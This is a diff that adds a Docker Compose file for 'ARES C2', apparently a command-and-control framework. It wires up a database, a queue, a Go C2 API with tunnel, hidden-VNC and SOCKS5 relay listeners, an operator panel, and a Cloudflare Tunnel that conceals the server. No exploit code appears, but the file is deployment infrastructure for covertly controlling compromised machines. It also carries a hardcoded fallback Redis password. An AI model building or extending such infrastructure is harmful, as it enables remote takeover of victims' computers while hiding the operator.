@@ -1,0 +1,125 @@
+# ARES C2 — Docker Compose (v5.0 Enterprise-Grade)
+# Usage: docker-compose up -d
+# All services bind to 127.0.0.1 — access via Cloudflare Tunnel only
+
+version: '3.8'
+
+services:
+  # ── PostgreSQL Database ──
+  postgres:
+    image: postgres:16-alpine
+    container_name: ares-db
+    environment:
+      POSTGRES_DB: ares
+      POSTGRES_USER: ares
+      POSTGRES_PASSWORD_FILE: /run/secrets/db_password
+    volumes:
+      - pgdata:/var/lib/postgresql/data
+      - ./c2server/internal/database/migrations:/docker-entrypoint-initdb.d:ro
+    secrets:
+      - db_password
+    networks:
+      - internal
+    restart: unless-stopped
+    healthcheck:
+      test: ["CMD-SHELL", "pg_isready -U ares"]
+      interval: 10s
+      timeout: 5s
+      retries: 5
+
+  # ── Redis Message Queue ──
+  redis:
+    image: redis:7-alpine
+    container_name: ares-queue
+    command: >
+      redis-server
+      --requirepass "${REDIS_PASSWORD:-ares_redis_secret}"
+      --maxmemory 256mb
+      --maxmemory-policy allkeys-lru
+    networks:
+      - internal
+    restart: unless-stopped
+    healthcheck:
+      test: ["CMD", "redis-cli", "ping"]
+      interval: 10s
+      timeout: 5s
+      retries: 5
+
+  # ── C2 API Server (Go) ──
+  c2:
+    build:
+      context: ./c2server
+      dockerfile: Dockerfile
+    container_name: ares-c2
+    ports:
+      - "127.0.0.1:8443:8443"    # HTTPS API
+      - "127.0.0.1:9090:9090"    # Tunnel listener
+      - "127.0.0.1:9091:9091"    # hVNC listener
+      - "127.0.0.1:1080:1080"    # SOCKS5 relay
+    environment:
+      DATABASE_URL: "postgres://ares:${DB_PASSWORD}@postgres:5432/ares?sslmode=disable"
+      REDIS_URL: "redis://:${REDIS_PASSWORD:-ares_redis_secret}@redis:6379/0"
+      BIND_ADDR: "0.0.0.0"
+      PORT: "8443"
+      DATA_DIR: "/data"
+    volumes:
+      - c2data:/data
+    depends_on:
+      postgres:
+        condition: service_healthy
+      redis:
+        condition: service_healthy
+    secrets:
+      - db_password
+      - relay_key
+      - master_encryption_key
+    networks:
+      - internal
+    restart: unless-stopped
+
+  # ── React Panel (Nginx) ──
+  panel:
+    build:
+      context: ./panel
+      dockerfile: Dockerfile
+    container_name: ares-panel
+    ports:
+      - "127.0.0.1:3000:80"
+    networks:
+      - internal
+    restart: unless-stopped
+
+  # ── Cloudflare Tunnel ──
+  cloudflared:
+    image: cloudflare/cloudflared:latest
+    container_name: ares-tunnel
+    command: tunnel run
+    volumes:
+      - ./infra/cloudflared:/etc/cloudflared:ro
+    networks:
+      - internal
+    restart: unless-stopped
+    depends_on:
+      - c2
+
+# ── Volumes ──
+volumes:
+  pgdata:
+    driver: local
+  c2data:
+    driver: local
+
+# ── Secrets ──
+secrets:
+  db_password:
+    file: ./secrets/db_password.txt
+  relay_key:
+    file: ./secrets/relay_key.txt
+  master_encryption_key:
+    file: ./secrets/master_key.txt
+
+# ── Network ──
+networks:
+  internal:
+    driver: bridge
+    internal: true
